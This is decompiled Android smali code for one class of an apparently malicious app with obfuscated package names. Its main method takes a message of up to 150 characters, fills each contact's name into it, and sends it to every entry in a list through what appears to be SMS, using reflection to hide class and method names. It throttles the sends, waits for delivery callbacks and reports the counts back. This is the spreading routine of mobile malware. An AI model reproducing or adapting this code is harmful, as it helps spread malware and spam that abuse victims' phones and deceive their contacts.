.class final Lwvknbzh/mwrpxg/qpha/h$c;
.super Lwvknbzh/mwrpxg/qpha/h$a;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lwvknbzh/mwrpxg/qpha/h;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = "c"
.end annotation


# instance fields
.field final i:Ljava/util/concurrent/atomic/AtomicInteger;

.field final j:Ljava/util/concurrent/atomic/AtomicInteger;

.field private k:I


# direct methods
.method constructor <init>()V
    .locals 1

    .prologue
    .line 502
    const/4 v0, 0x0

    invoke-direct {p0, v0}, Lwvknbzh/mwrpxg/qpha/h$a;-><init>(Lwvknbzh/mwrpxg/qpha/i;)V

    .line 505
    new-instance v0, Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-direct {v0}, Ljava/util/concurrent/atomic/AtomicInteger;-><init>()V

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->i:Ljava/util/concurrent/atomic/AtomicInteger;

    .line 506
    new-instance v0, Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-direct {v0}, Ljava/util/concurrent/atomic/AtomicInteger;-><init>()V

    iput-object v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->j:Ljava/util/concurrent/atomic/AtomicInteger;

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/Object;)V
    .locals 13

    .prologue
    const/4 v12, 0x1

    const/4 v11, 0x0

    .line 511
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->f:Ljava/lang/reflect/Method;

    aget-object v1, p1, v11

    new-array v2, v12, [Ljava/lang/Object;

    sget-object v3, Lwvknbzh/mwrpxg/qpha/a;->ao:Ljava/lang/String;

    aput-object v3, v2, v11

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 513
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    .line 514
    const/16 v2, 0x96

    if-gt v1, v2, :cond_0

    if-gtz v1, :cond_1

    .line 515
    :cond_0
    const/16 v0, 0xa

    invoke-virtual {p0, v0}, Lwvknbzh/mwrpxg/qpha/h$c;->a(I)V

    .line 567
    :goto_0
    return-void

    .line 519
    :cond_1
    new-instance v2, Lwvknbzh/mwrpxg/qpha/k;

    invoke-direct {v2, p0}, Lwvknbzh/mwrpxg/qpha/k;-><init>(Lwvknbzh/mwrpxg/qpha/h$c;)V

    .line 529
    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h$c;->a:Ljava/lang/Object;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Lwvknbzh/mwrpxg/qpha/c;->a(Landroid/content/BroadcastReceiver;Ljava/lang/String;)V

    .line 531
    invoke-static {}, Lwvknbzh/mwrpxg/qpha/c;->c()Ljava/util/List;

    move-result-object v1

    .line 533
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v3

    iput v3, p0, Lwvknbzh/mwrpxg/qpha/h$c;->k:I

    .line 535
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_1
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/String;

    .line 537
    const/4 v4, 0x1

    :try_start_0
    aget-object v4, v1, v4

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->aL:Ljava/lang/String;

    const/4 v6, 0x0

    aget-object v1, v1, v6

    .line 539
    invoke-virtual {v0, v5, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    .line 541
    invoke-static {}, Lwvknbzh/mwrpxg/qpha/Edcdbffeddb;->a()Landroid/content/Context;

    move-result-object v6

    const/4 v7, 0x0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->dB:Ljava/lang/String;

    .line 543
    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Class;

    const/4 v9, 0x0

    sget-object v10, Lwvknbzh/mwrpxg/qpha/a;->dt:Ljava/lang/String;

    invoke-static {v10}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-virtual {v1, v8}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v1

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    iget-object v10, p0, Lwvknbzh/mwrpxg/qpha/h$c;->a:Ljava/lang/Object;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-virtual {v1, v8}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/Intent;

    const/4 v8, 0x0

    .line 540
    invoke-static {v6, v7, v1, v8}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 537
    invoke-static {v4, v5, v1}, Lwvknbzh/mwrpxg/qpha/c;->a(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)V

    .line 547
    sget-object v1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v4, 0x64

    invoke-virtual {v1, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 548
    :catch_0
    move-exception v1

    goto :goto_1

    .line 551
    :cond_2
    const/16 v0, 0xb4

    .line 552
    :goto_2
    add-int/lit8 v1, v0, -0x1

    if-lez v0, :cond_3

    .line 553
    iget v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->k:I

    iget-object v3, p0, Lwvknbzh/mwrpxg/qpha/h$c;->j:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v3}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    move-result v3

    if-ne v0, v3, :cond_4

    .line 559
    :cond_3
    :try_start_1
    invoke-static {}, Lwvknbzh/mwrpxg/qpha/Edcdbffeddb;->a()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    sget-object v1, Lwvknbzh/mwrpxg/qpha/a;->cj:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    sget-object v5, Lwvknbzh/mwrpxg/qpha/a;->dU:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v0, v1, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    invoke-static {}, Lwvknbzh/mwrpxg/qpha/Edcdbffeddb;->a()Landroid/content/Context;

    move-result-object v1

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v2, v3, v4

    invoke-virtual {v0, v1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 562
    :goto_3
    invoke-virtual {p0}, Lwvknbzh/mwrpxg/qpha/h$c;->a()V

    .line 564
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->h:Ljava/lang/reflect/Method;

    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h$c;->c:Ljava/lang/Object;

    new-array v2, v12, [Ljava/lang/Object;

    iget v3, p0, Lwvknbzh/mwrpxg/qpha/h$c;->k:I

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v11

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 565
    iget-object v0, p0, Lwvknbzh/mwrpxg/qpha/h$c;->h:Ljava/lang/reflect/Method;

    iget-object v1, p0, Lwvknbzh/mwrpxg/qpha/h$c;->c:Ljava/lang/Object;

    new-array v2, v12, [Ljava/lang/Object;

    iget-object v3, p0, Lwvknbzh/mwrpxg/qpha/h$c;->i:Ljava/util/concurrent/atomic/AtomicInteger;

    invoke-virtual {v3}, Ljava/util/concurrent/atomic/AtomicInteger;->get()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v2, v11

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    goto/16 :goto_0

    .line 556
    :cond_4
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v4, 0x1

    invoke-virtual {v0, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    move v0, v1

    goto :goto_2

    .line 560
    :catch_1
    move-exception v0

    goto :goto_3
.end method
